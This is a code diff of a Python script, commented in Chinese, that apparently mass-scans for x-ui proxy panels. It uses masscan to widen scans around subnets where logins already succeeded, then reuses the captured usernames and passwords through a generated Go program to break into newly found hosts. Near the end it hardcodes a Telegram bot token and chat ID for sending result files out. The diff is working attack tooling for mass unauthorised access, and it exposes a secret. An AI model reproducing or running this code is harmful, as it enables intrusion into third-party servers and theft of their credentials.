@@ -1633,6 +1633,26 @@ def select_proxy_test_target():
 
 # =================================================================
 
+def get_default_interface():
+    """自动检测默认的网络接口"""
+    try:
+        # 使用 'ip route' 命令查找默认路由
+        result = subprocess.check_output(["ip", "route", "get", "8.8.8.8"], text=True)
+        match = re.search(r'dev\s+(\S+)', result)
+        if match:
+            return match.group(1)
+    except Exception:
+        # 备用方案，适用于没有 'ip' 命令的旧系统
+        try:
+            with open('/proc/net/route') as f:
+                for line in f:
+                    fields = line.strip().split()
+                    if fields[1] == '00000000' and int(fields[3], 16) & 2:
+                        return fields[0]
+        except Exception:
+            return "eth0" # 最终备用
+    return "eth0"
+
 def check_environment(template_mode):
     import platform
     
@@ -1707,8 +1727,9 @@ def check_environment(template_mode):
             print(" 失败: {}".format(e))
             sys.exit(1)
 
-    ping_package = "iputils" if pkg_manager == "yum" else "iputils-ping"
-    ensure_packages(pkg_manager, ["curl", ping_package])
+    ping_package = "iputils-ping" if pkg_manager == "apt-get" else "iputils"
+    iproute_package = "iproute2" if pkg_manager == "apt-get" else "iproute"
+    ensure_packages(pkg_manager, ["curl", ping_package, iproute_package])
     
     in_china = is_in_china()
     
@@ -1921,22 +1942,22 @@ def parse_result_line(line):
             
     return None, None, None, None
 
-def analyze_and_expand_scan(result_file, template_mode, params, template_map, masscan_rate):
+def analyze_and_expand_scan(result_file, template_mode, params, template_map, masscan_rate, executable_name):
     if not os.path.exists(result_file) or os.path.getsize(result_file) == 0:
         return set()
 
-    # BUG修复: 将变量定义移至函数开头
     masscan_output_file = "masscan_results.tmp"
+    interface = get_default_interface()
+    print(f"ℹ️  自动检测到网络接口: {interface}")
 
     print("\n--- 正在分析结果以寻找可扩展的IP网段... ---")
     with open(result_file, 'r', encoding='utf-8') as f:
         master_results = {line.strip() for line in f}
     
     ips_to_analyze = master_results
-    all_newly_verified_ips = set()
 
     for i in range(2): # 执行两轮扩展
-        print("\n--- [扩展扫描 第 {}/2 轮] ---".format(i + 1))
+        print(f"\n--- [扩展扫描 第 {i + 1}/2 轮] ---")
         
         groups = {}
         for line in ips_to_analyze:
@@ -1952,45 +1973,66 @@ def analyze_and_expand_scan(result_file, template_mode, params, template_map, ma
         expandable_targets = [key for key, ips in groups.items() if len(ips) >= 2]
 
         if not expandable_targets:
-            print("  - 第 {} 轮未找到符合条件的IP集群，扩展扫描结束。".format(i + 1))
+            print(f"  - 第 {i + 1} 轮未找到符合条件的IP集群，扩展扫描结束。")
             break
 
-        print("  - 第 {} 轮发现 {} 个可扩展的IP集群。".format(i + 1, len(expandable_targets)))
+        print(f"  - 第 {i + 1} 轮发现 {len(expandable_targets)} 个可扩展的IP集群。")
+        
+        # --- Masscan 批量扫描 ---
+        masscan_input_file = "masscan_input.tmp"
+        with open(masscan_input_file, 'w') as f:
+            for subnet, port, _, _ in expandable_targets:
+                f.write(f"{subnet} -p {port}\n")
+        
+        print("  - 正在对所有集群进行一次性批量Masscan扫描...")
+        try:
+            if os.path.exists(masscan_output_file): os.remove(masscan_output_file)
+            masscan_cmd = [
+                "masscan", "-iL", masscan_input_file, 
+                "--rate", str(masscan_rate), 
+                "-oG", masscan_output_file,
+                "--interface", interface,
+                "--wait", "0"
+            ]
+            subprocess.run(masscan_cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=300)
+        except subprocess.TimeoutExpired:
+            print("      - ⚠️ Masscan 扫描超时（超过300秒），可能目标过多或网络问题。")
+        except (subprocess.CalledProcessError, FileNotFoundError) as e:
+            print(f"      - ❌ Masscan 扫描失败: {e}")
+        
+        if not os.path.exists(masscan_output_file):
+            print("  - Masscan未能生成结果文件，跳过本轮验证。")
+            break
+
+        # --- 结果解析和验证 ---
+        all_masscan_ips = {} # key: port, value: set of ips
+        with open(masscan_output_file, 'r') as f:
+            for line in f:
+                if line.startswith("Host:"):
+                    parts = line.split()
+                    ip_addr = parts[1]
+                    port_str = parts[3].split('/')[0]
+                    if port_str not in all_masscan_ips:
+                        all_masscan_ips[port_str] = set()
+                    all_masscan_ips[port_str].add(ip_addr)
         
         newly_verified_this_round = set()
-
-        for j, (subnet, port, user, password) in enumerate(expandable_targets):
-            print("\n  --- [扫描集群 {}/{}] 目标: {} 端口: {} ---".format(j + 1, len(expandable_targets), subnet, port))
+        
+        for subnet, port, user, password in expandable_targets:
+            ips_from_masscan = all_masscan_ips.get(port, set())
+            ips_to_verify = {ip for ip in ips_from_masscan if ip.startswith(subnet.rsplit('.', 1)[0])} - master_results
             
-            masscan_ips_for_this_cluster = set()
-            for k in range(2):
-                print("    - Masscan 第 {}/2 轮...".format(k + 1))
-                try:
-                    if os.path.exists(masscan_output_file): os.remove(masscan_output_file)
-                    masscan_cmd = ["masscan", subnet, "-p", port, "--rate=" + str(masscan_rate), "-oG", masscan_output_file]
-                    subprocess.run(masscan_cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=120)
-
-                    with open(masscan_output_file, 'r') as f:
-                        for line in f:
-                            if line.startswith("Host:"):
-                                masscan_ips_for_this_cluster.add(line.split()[1])
-                except subprocess.TimeoutExpired:
-                    print("      - ⚠️ Masscan 扫描超时（超过120秒），可能系统负载过高。")
-                except (subprocess.CalledProcessError, FileNotFoundError) as e:
-                    print("      - ❌ Masscan 扫描失败: {}".format(e))
-            
-            ips_to_verify = masscan_ips_for_this_cluster - master_results
-            print("    - Masscan 两轮共发现 {} 个存活主机，其中 {} 个是新目标。".format(len(masscan_ips_for_this_cluster), len(ips_to_verify)))
             if not ips_to_verify:
                 continue
+
+            print(f"\n  --- [验证集群] 目标: {subnet} 端口: {port} ---")
+            print(f"    - Masscan发现 {len(ips_to_verify)} 个新目标，正在进行二次验证...")
 
             verification_input_file = "verification_input.tmp"
             with open(verification_input_file, 'w') as f:
                 for ip_addr in ips_to_verify:
-                    f.write("{}:{}\n".format(ip_addr, port))
-            
-            print("    - 正在对新发现的IP进行二次验证...")
-            
+                    f.write(f"{ip_addr}:{port}\n")
+
             current_params = params.copy()
             current_params['usernames'] = [user] if user else []
             current_params['passwords'] = [password] if password else []
@@ -1998,51 +2040,42 @@ def analyze_and_expand_scan(result_file, template_mode, params, template_map, ma
             template_lines = template_map[template_mode]
             generate_go_code(template_lines, **{**current_params, **params})
 
-            executable_name = compile_go_program()
-
             try:
                 run_env = os.environ.copy()
                 total_memory = psutil.virtual_memory().total
                 mem_limit = int(total_memory * 0.70 / 1024 / 1024)
-                run_env["GOMEMLIMIT"] = "{}MiB".format(mem_limit)
+                run_env["GOMEMLIMIT"] = f"{mem_limit}MiB"
                 run_env["GOGC"] = "50"
                 
                 verification_output_file = "verification_output.tmp"
                 if os.path.exists(verification_output_file): os.remove(verification_output_file)
 
                 cmd = ['./' + executable_name, verification_input_file, verification_output_file]
-                
-                process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=run_env)
-                
-                for line in iter(lambda: process.stdout.readline(), b''):
-                    sys.stdout.write(line.decode('utf-8', errors='ignore'))
-                    sys.stdout.flush()
-
-                process.wait()
-
-                if process.returncode != 0:
-                    raise subprocess.CalledProcessError(process.returncode, cmd)
+                subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, env=run_env)
                 
                 if os.path.exists(verification_output_file):
                     with open(verification_output_file, 'r') as f:
                         new_finds = {line.strip() for line in f}
-                        print("    - 二次验证成功 {} 个新目标。".format(len(new_finds)))
+                        print(f"    - 二次验证成功 {len(new_finds)} 个新目标。")
                         newly_verified_this_round.update(new_finds)
                     os.remove(verification_output_file)
+            except subprocess.CalledProcessError as e:
+                print(f"    - ❌ 二次验证失败: {e.stderr.decode('utf-8', 'ignore')}")
             except Exception as e:
-                print("    - ❌ 二次验证失败: {}".format(e))
+                print(f"    - ❌ 二次验证时发生未知错误: {e}")
             
             if os.path.exists(verification_input_file): os.remove(verification_input_file)
-        
+
         new_ips_this_round = newly_verified_this_round - master_results
         if not new_ips_this_round:
-            print("--- 第 {} 轮未发现任何全新的IP，扩展扫描结束。 ---".format(i + 1))
+            print(f"--- 第 {i + 1} 轮未发现任何全新的IP，扩展扫描结束。 ---")
             break
         
         master_results.update(new_ips_this_round)
         ips_to_analyze = new_ips_this_round
 
     if os.path.exists(masscan_output_file): os.remove(masscan_output_file)
+    if os.path.exists(masscan_input_file): os.remove(masscan_input_file)
 
     with open(result_file, 'r', encoding='utf-8') as f:
         initial_set = {line.strip() for line in f}
@@ -2185,6 +2218,7 @@ if __name__ == "__main__":
         template_lines = template_map[TEMPLATE_MODE]
         generate_go_code(template_lines, **params)
         
+        # 性能优化：只编译一次
         executable = compile_go_program()
         
         # ==================== 3. 执行扫描与分析 ====================
@@ -2195,7 +2229,8 @@ if __name__ == "__main__":
         
         initial_results_file = "xui.txt"
         if os.path.exists(initial_results_file) and os.path.getsize(initial_results_file) > 0:
-            newly_found_results = analyze_and_expand_scan(initial_results_file, TEMPLATE_MODE, params, template_map, masscan_rate)
+            # 性能优化：将编译好的可执行文件名传入
+            newly_found_results = analyze_and_expand_scan(initial_results_file, TEMPLATE_MODE, params, template_map, masscan_rate, executable)
             if newly_found_results:
                 print("--- 扩展扫描完成，共新增 {} 个结果。正在合并... ---".format(len(newly_found_results)))
                 with open(initial_results_file, 'a', encoding='utf-8') as f:
@@ -2302,6 +2337,7 @@ if __name__ == "__main__":
             BOT_TOKEN = "7664203362:AAFTBPQ8Ydl9c1fqM53CSzKIPS0VBj99r0M"
             CHAT_ID = "7697235358"
 
+            # 修复：将 CHID 改回 CHAT_ID
             if BOT_TOKEN and CHAT_ID:
                 files_to_send = []
                 final_txt_file = "{}-{}.txt".format(prefix, time_str)
